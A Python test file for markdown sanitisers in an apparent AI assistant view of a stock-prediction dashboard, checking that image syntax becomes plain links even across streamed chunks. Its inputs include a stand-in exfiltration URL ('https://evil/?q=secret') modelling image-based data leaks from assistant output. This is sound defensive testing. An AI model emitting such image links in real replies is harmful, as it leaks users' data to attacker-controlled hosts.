from __future__ import annotations

from stock_predictor.dashboard.views.assistant import safe_markdown, safe_stream


def test_safe_markdown_turns_images_into_links_and_escapes_dollars():
    assert safe_markdown("see ![x](https://evil/?q=secret)") == "see [x](https://evil/?q=secret)"
    assert safe_markdown("price $333 and $5") == r"price \$333 and \$5"


def test_safe_stream_catches_an_image_marker_split_across_chunks():
    out = "".join(safe_stream(iter(["look ", "!", "[a](https://evil)", " done!"])))
    assert out == "look [a](https://evil) done!"


def test_safe_stream_passes_plain_text_through_and_keeps_a_trailing_bang():
    assert "".join(safe_stream(iter(["Hello", " world", "!"]))) == "Hello world!"
